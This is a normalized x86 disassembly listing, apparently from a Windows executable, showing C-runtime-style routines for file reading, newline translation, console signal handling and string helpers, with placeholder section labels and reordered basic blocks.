mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_418c09
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_40d7df
and [ eax ] 0x0
call sub_40d7cc
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_40d7df
mov [ eax ] ebx
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rwxdata ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rwxdata ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_40d7df
mov [ eax ] ebx
call sub_40d7cc
mov [ eax ] 0x9
jmp r-xdata
call sub_40d7df
mov [ eax ] ebx
call sub_40d7cc
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_413447
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_4117d6
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_40d7cc
mov [ eax ] 0xc
call sub_40d7df
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_40d7f2
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_40fe78
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rwxdata ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rwxdata ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_4117d6
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_4117d6
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_4117d6
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_4191cb
push 0x10
push r--data
call sub_40e30c
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_40d7df
and [ eax ] 0x0
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] esi
call sub_40d7cc
mov [ eax ] 0x9
cmp eax [ rwxdata ]
jb r-xdata
call sub_40e351
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rwxdata ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_417569
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_40d7df
mov [ eax ] esi
call sub_40d7cc
mov [ eax ] 0x16
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418c09
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40d749
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4192be
mov eax [ ebp - 0x1c ]
sub_4192c8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_40d7cc
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_40d7cc
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
mov eax esi
jmp r-xdata
sub_419330
push 0xc
push r--data
call sub_40e30c
push 0xe
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419397
call sub_40e351
retn
mov eax [ rwxdata ]
mov edx rwxdata
push [ esi + 0x4 ]
call sub_40fe78
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_40fe78
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_4193a0
push 0xc
push r--data
call sub_40e30c
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp [ edi + 0x4 ] ebx
jne r-xdata
mov eax [ edi + 0x4 ]
push 0x2800
push sub_40fe78
push sub_4107e9
push ebx
lea eax [ edi + 0x9 ]
push eax
push ebx
call sub_426326
add esp 0x18
mov [ ebp - 0x1c ] eax
cmp eax ebx
jne r-xdata
push eax
call sub_4136f0
pop ecx
mov esi eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp esi ebx
ja r-xdata
call sub_40e351
retn
dec esi
mov eax [ ebp - 0x1c ]
add eax esi
cmp [ eax ] 0x20
jne r-xdata
dec esi
push 0xe
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ edi + 0x4 ] ebx
jne r-xdata
mov [ eax ] bl
push [ ebp - 0x1c ]
call sub_40fe78
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41948c
push 0x8
call sub_4107e9
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
add esi 0x2
push esi
call sub_4107e9
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
push ebx
call sub_40fe78
pop ecx
push [ ebp - 0x1c ]
push esi
push eax
call sub_4192c8
add esp 0xc
xor ecx ecx
cmp eax ecx
je r-xdata
mov eax [ edi + 0x4 ]
mov [ ebx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov [ eax + 0x4 ] ebx
jmp r-xdata
push ecx
push ecx
push ecx
push ecx
push ecx
call sub_40d5e2
add esp 0x14
sub_419495
push 0xc
push r--data
call sub_40e30c
push 0xe
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4194fc
call sub_40e351
retn
mov eax [ rwxdata ]
mov edx rwxdata
push [ esi + 0x4 ]
call sub_40fe78
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_40fe78
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_419505
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push sub_40fe78
push sub_4107e9
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_426326
add esp 0x18
pop ebp
retn
mov [ ebp + 0x14 ] 0x2800
sub_419538
push 0x10
push r--data
call sub_40e30c
xor ebx ebx
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
push 0xe
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41963e
push 0x2800
push ebx
add esi 0x9
push esi
push ebx
call sub_419505
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi ebx
jne r-xdata
push edi
call sub_4136f0
pop ecx
mov esi eax
mov [ ebp - 0x20 ] esi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rwxdata
call sub_40e52c
add esp 0xc
xor eax eax
jmp r-xdata
push 0x8
call sub_4107e9
pop ecx
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ esi + edi ]
cmp [ eax ] 0x20
jne r-xdata
call sub_40e351
retn
push [ ebp - 0x1c ]
call sub_40fe78
pop ecx
mov esi [ ebp + 0x8 ]
lea ebx [ esi + 0x2 ]
push ebx
call sub_4107e9
pop ecx
mov esi eax
test esi esi
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
push edi
call sub_40fe78
pop ecx
push [ ebp - 0x1c ]
push ebx
push esi
call sub_4192c8
add esp 0xc
xor ecx ecx
cmp eax ecx
je r-xdata
mov eax esi
dec esi
mov [ ebp - 0x20 ] esi
test eax eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] esi
mov [ edi ] esi
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov [ edi + 0x4 ] ecx
mov [ eax + 0x4 ] edi
jmp r-xdata
push ecx
push ecx
push ecx
push ecx
push ecx
call sub_40d5e2
add esp 0x14
sub_419647
push 0x8
push r--data
call sub_40e30c
push 0xe
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419691
call sub_40e351
retn
mov edi [ esi + 0x4 ]
push [ esi ]
call sub_40fe78
push esi
call sub_40fe78
pop ecx
pop ecx
mov esi edi
jmp r-xdata
test esi esi
je r-xdata
sub_4196a0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_419728
push 0x10
push r--data
call sub_40e30c
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rwxdata ] 0x3
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rwxdata ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_417ce5
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_40e351
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4197c2
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_419817
push 0x8
push r--data
call sub_40e30c
push [ rwxdata ]
call sub_40e714
pop ecx
test eax eax
je r-xdata
call sub_4197cb
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_41987e
push 0x10
push r--data
call sub_40e30c
xor edi edi
push edi
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov esi rwxdata
push [ rwxdata ]
call sub_40e714
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x15
mov esi rwxdata
push [ rwxdata ]
call sub_40e714
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4198f9
cmp [ ebp - 0x1c ] edi
jne r-xdata
cmp eax 0x1
je r-xdata
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp - 0x1c ] 0x1
je r-xdata
xor eax eax
jmp r-xdata
call sub_40e70b
mov [ esi ] eax
xor eax eax
inc eax
push [ ebp - 0x20 ]
call [ ebp - 0x1c ]
pop ecx
call sub_40e351
retn 0x4
sub_419919
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_41996f
push 0x10
push r--data
call sub_40e30c
and [ ebp - 0x20 ] 0x0
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp esi 0x4
je r-xdata
cmp ebx 0x1
je r-xdata
cmp esi 0x3
je r-xdata
or eax 0xffffffff
cmp ebx 0x3
je r-xdata
push 0x2
pop edi
cmp ebx edi
je r-xdata
cmp ebx 0xd
je r-xdata
push 0x0
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
cmp ebx edi
je r-xdata
cmp ebx 0x15
je r-xdata
cmp ebx 0xf
jle r-xdata
cmp [ rwxdata ] 0x0
jne r-xdata
cmp ebx 0x15
jne r-xdata
cmp ebx 0x16
je r-xdata
call sub_40d7cc
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d749
add esp 0x14
cmp ebx 0x11
jle r-xdata
mov eax ebx
sub eax edi
je r-xdata
push 0x1
push sub_41987e
call [ SetConsoleCtrlHandler@IAT ]
xor ecx ecx
inc ecx
cmp eax ecx
jne r-xdata
cmp ebx 0x6
je r-xdata
push [ rwxdata ]
call sub_40e714
pop ecx
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x4
je r-xdata
call sub_40d7df
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov [ ebp - 0x20 ] 0x1
mov esi [ ebp + 0xc ]
mov [ rwxdata ] ecx
jmp r-xdata
cmp ebx 0xf
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419b67
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push esi
call sub_40e699
mov [ rwxdata ] eax
push [ rwxdata ]
call sub_40e714
pop ecx
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x9
je r-xdata
cmp ebx 0x8
je r-xdata
mov edx [ ebp - 0x1c ]
push esi
call sub_40e699
mov [ rwxdata ] eax
jmp r-xdata
push [ rwxdata ]
call sub_40e714
pop ecx
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x6
je r-xdata
call sub_40e924
mov esi eax
test esi esi
je r-xdata
cmp ebx 0x4
je r-xdata
call sub_40e351
retn
pop ecx
push esi
call sub_40e699
mov [ rwxdata ] eax
jmp r-xdata
push [ rwxdata ]
call sub_40e714
pop ecx
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
dec eax
jne r-xdata
mov edi r--data
cmp [ esi + 0x5c ] edi
jne r-xdata
cmp ebx 0xb
jne r-xdata
push esi
call sub_40e699
mov [ rwxdata ] eax
jmp r-xdata
push [ esi + 0x5c ]
mov edx ebx
call sub_419919
pop ecx
test eax eax
je r-xdata
push [ rwxdata ]
call sub_413447
pop ecx
mov [ esi + 0x5c ] eax
test eax eax
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
je r-xdata
push [ rwxdata ]
push edi
push eax
call sub_40f720
add esp 0xc
mov eax edx
jmp r-xdata
jmp r-xdata
cmp [ eax + 0x4 ] ebx
je r-xdata
mov [ eax + 0x8 ] ecx
add eax 0xc
mov edi [ rwxdata ]
imul edi edi 0xc
add edi [ esi + 0x5c ]
cmp eax edi
jae r-xdata
jmp r-xdata
sub_419bac
push 0x20
push r--data
call sub_40e30c
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rwxdata
mov eax [ rwxdata ]
sub eax 0x6
je r-xdata
call sub_40e924
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_40e351
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rwxdata
mov eax [ rwxdata ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_419919
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rwxdata
mov eax [ rwxdata ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_410d00
mov [ ebp - 0x1c ] 0x1
push eax
call sub_40e714
mov esi rwxdata
mov eax [ rwxdata ]
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d749
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_4160e9
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_40e70b
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rwxdata ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419d20
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_419d6b
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
push [ rwxdata ]
call sub_40e714
mov edi eax
mov eax [ ebp + 0x8 ]
xor esi esi
pop ecx
cmp eax esi
jne r-xdata
push ebx
mov [ eax ] esi
cmp edi esi
jne r-xdata
